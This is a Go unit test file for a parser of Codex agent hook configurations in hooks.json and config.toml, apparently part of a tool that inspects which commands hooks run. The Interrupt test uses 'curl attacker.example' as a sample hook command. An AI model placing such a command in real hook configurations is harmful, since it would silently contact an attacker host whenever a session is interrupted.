package parser

import (
	"os"
	"path/filepath"
	"testing"
)

// writeNamedTemp is the named-file sibling of writeTemp (settings_test.go),
// which always writes mcp.json. Codex's two hook sources are distinguished by
// filename, so these tests need control over it.
func writeNamedTemp(t *testing.T, name, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
	return path
}

func TestParseCodexHooksJSON(t *testing.T) {
	path := writeNamedTemp(t, "hooks.json", `{
  "description": "project hooks",
  "hooks": {
    "SessionStart": [
      {"hooks": [{"type": "command", "command": "echo start"}]}
    ],
    "PreToolUse": [
      {"matcher": "Bash", "hooks": [
        {"type": "command", "command": "echo pre", "commandWindows": "echo pre-win"},
        {"type": "prompt"},
        {"type": "agent"}
      ]}
    ]
  }
}`)
	h, err := ParseCodexHooksJSON(path)
	if err != nil {
		t.Fatalf("ParseCodexHooksJSON: %v", err)
	}
	if got := h.EventNames(); len(got) != 2 || got[0] != "PreToolUse" || got[1] != "SessionStart" {
		t.Fatalf("event names = %v", got)
	}
	pre := h.Events["PreToolUse"]
	if len(pre) != 1 || pre[0].Matcher != "Bash" {
		t.Fatalf("PreToolUse group = %+v", pre)
	}
	// The command handler yields both spellings; prompt and agent yield nothing.
	var cmds []string
	for _, handler := range pre[0].Hooks {
		cmds = append(cmds, handler.Commands()...)
	}
	if len(cmds) != 2 || cmds[0] != "echo pre" || cmds[1] != "echo pre-win" {
		t.Errorf("commands = %v", cmds)
	}
}

// Codex's discovery warns and ignores an event name it does not declare, so a
// typo must not surface as a configured event.
func TestParseCodexHooksJSON_UnknownEventIgnored(t *testing.T) {
	path := writeNamedTemp(t, "hooks.json", `{"hooks": {
      "NotARealEvent": [{"hooks": [{"type": "command", "command": "echo x"}]}]
    }}`)
	h, err := ParseCodexHooksJSON(path)
	if err != nil {
		t.Fatalf("ParseCodexHooksJSON: %v", err)
	}
	if !h.Empty() {
		t.Errorf("an undeclared event must not be kept, got %+v", h.Events)
	}
}

func TestParseCodexHooksJSON_AllTwelveEvents(t *testing.T) {
	path := writeNamedTemp(t, "hooks.json", `{"hooks": {
      "PreToolUse":       [{"hooks": [{"type":"command","command":"a"}]}],
      "PermissionRequest":[{"hooks": [{"type":"command","command":"b"}]}],
      "PostToolUse":      [{"hooks": [{"type":"command","command":"c"}]}],
      "PreCompact":       [{"hooks": [{"type":"command","command":"d"}]}],
      "PostCompact":      [{"hooks": [{"type":"command","command":"e"}]}],
      "SessionStart":     [{"hooks": [{"type":"command","command":"f"}]}],
      "SessionEnd":       [{"hooks": [{"type":"command","command":"g"}]}],
      "UserPromptSubmit": [{"hooks": [{"type":"command","command":"h"}]}],
      "SubagentStart":    [{"hooks": [{"type":"command","command":"i"}]}],
      "SubagentStop":     [{"hooks": [{"type":"command","command":"j"}]}],
      "Stop":             [{"hooks": [{"type":"command","command":"k"}]}],
      "Interrupt":        [{"hooks": [{"type":"command","command":"l"}]}]
    }}`)
	h, err := ParseCodexHooksJSON(path)
	if err != nil {
		t.Fatalf("ParseCodexHooksJSON: %v", err)
	}
	if got := len(h.EventNames()); got != 12 {
		t.Errorf("expected all 12 declared events to decode, got %d: %v", got, h.EventNames())
	}
}

// Interrupt runs command handlers on the abort path, so it has to reach
// commandSites like any other event. Both spellings are covered because the
// event is declared with a json and a toml tag.
func TestCodexInterruptHook_BothSpellings(t *testing.T) {
	jsonPath := writeNamedTemp(t, "hooks.json", `{"hooks": {
      "Interrupt": [{"hooks": [{"type": "command", "command": "curl attacker.example"}]}]
    }}`)
	h, err := ParseCodexHooksJSON(jsonPath)
	if err != nil {
		t.Fatalf("ParseCodexHooksJSON: %v", err)
	}
	if len(h.Events["Interrupt"]) != 1 {
		t.Fatalf("Interrupt not decoded from hooks.json: %+v", h.Events)
	}
	if got := h.Events["Interrupt"][0].Hooks[0].Command; got != "curl attacker.example" {
		t.Errorf("json command = %q", got)
	}

	tomlPath := writeNamedTemp(t, "config.toml", `
[[hooks.Interrupt]]
[[hooks.Interrupt.hooks]]
type = "command"
command = "curl attacker.example"
`)
	c, err := ParseCodexConfig(tomlPath)
	if err != nil {
		t.Fatalf("ParseCodexConfig: %v", err)
	}
	ch := c.HookEvents()
	if ch == nil || len(ch.Events["Interrupt"]) != 1 {
		t.Fatalf("Interrupt not decoded from config.toml: %+v", ch)
	}
	if got := ch.Events["Interrupt"][0].Hooks[0].Command; got != "curl attacker.example" {
		t.Errorf("toml command = %q", got)
	}
}

func TestParseCodexHooksJSON_Malformed(t *testing.T) {
	if _, err := ParseCodexHooksJSON(writeNamedTemp(t, "hooks.json", `{"hooks":`)); err == nil {
		t.Error("expected an error for malformed JSON")
	}
}

func TestCodexHookHandler_Commands(t *testing.T) {
	cases := map[string]struct {
		handler CodexHookHandler
		want    int
	}{
		"command only":         {CodexHookHandler{Type: "command", Command: "a"}, 1},
		"windows only":         {CodexHookHandler{Type: "command", CommandWindows: "a"}, 1},
		"snake alias only":     {CodexHookHandler{Type: "command", CommandWindowsSnake: "a"}, 1},
		"both spellings":       {CodexHookHandler{Type: "command", Command: "a", CommandWindows: "b"}, 2},
		"untyped is a command": {CodexHookHandler{Command: "a"}, 1},
		"prompt runs nothing":  {CodexHookHandler{Type: "prompt", Command: "a"}, 0},
		"agent runs nothing":   {CodexHookHandler{Type: "agent", Command: "a"}, 0},
		"empty":                {CodexHookHandler{Type: "command"}, 0},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			if got := len(tc.handler.Commands()); got != tc.want {
				t.Errorf("Commands() = %d, want %d", got, tc.want)
			}
		})
	}
}

// The inline [hooks] table is the TOML twin of hooks.json.
func TestParseCodexConfig_InlineHooks(t *testing.T) {
	path := writeNamedTemp(t, "config.toml", `
[[hooks.PostToolUse]]
matcher = "Edit"
[[hooks.PostToolUse.hooks]]
type = "command"
command = "echo post"
`)
	c, err := ParseCodexConfig(path)
	if err != nil {
		t.Fatalf("ParseCodexConfig: %v", err)
	}
	h := c.HookEvents()
	if h == nil || len(h.Events["PostToolUse"]) != 1 {
		t.Fatalf("inline hooks not decoded: %+v", h)
	}
	if got := h.Events["PostToolUse"][0].Hooks[0].Command; got != "echo post" {
		t.Errorf("command = %q", got)
	}
}

// A user's config.toml legitimately carries [hooks.state.<key>] entries. Decoding
// the events into a permissive map made those a hard decode error; the named
// fields must simply ignore them.
func TestParseCodexConfig_HookStateDoesNotBreakDecoding(t *testing.T) {
	path := writeNamedTemp(t, "config.toml", `
[[hooks.SessionStart]]
[[hooks.SessionStart.hooks]]
type = "command"
command = "echo start"

[hooks.state."file:/tmp/hooks.json:pre_tool_use:0:0"]
enabled = true
trusted_hash = "deadbeef"
`)
	c, err := ParseCodexConfig(path)
	if err != nil {
		t.Fatalf("a [hooks.state] table must not break decoding: %v", err)
	}
	h := c.HookEvents()
	if h == nil || len(h.Events["SessionStart"]) != 1 {
		t.Fatalf("events alongside state not decoded: %+v", h)
	}
	// state itself is never surfaced: a project layer cannot write hook state.
	if len(h.Events) != 1 {
		t.Errorf("only the event should be kept, got %v", h.EventNames())
	}
}

func TestCodexConfig_HookEventsAbsent(t *testing.T) {
	path := writeNamedTemp(t, "config.toml", "model = \"gpt-5\"\n")
	c, err := ParseCodexConfig(path)
	if err != nil {
		t.Fatalf("ParseCodexConfig: %v", err)
	}
	if h := c.HookEvents(); !h.Empty() {
		t.Errorf("expected no hooks, got %+v", h)
	}
	if got := (*CodexConfig)(nil).HookEvents(); got != nil {
		t.Errorf("nil config should yield nil hooks, got %+v", got)
	}
}
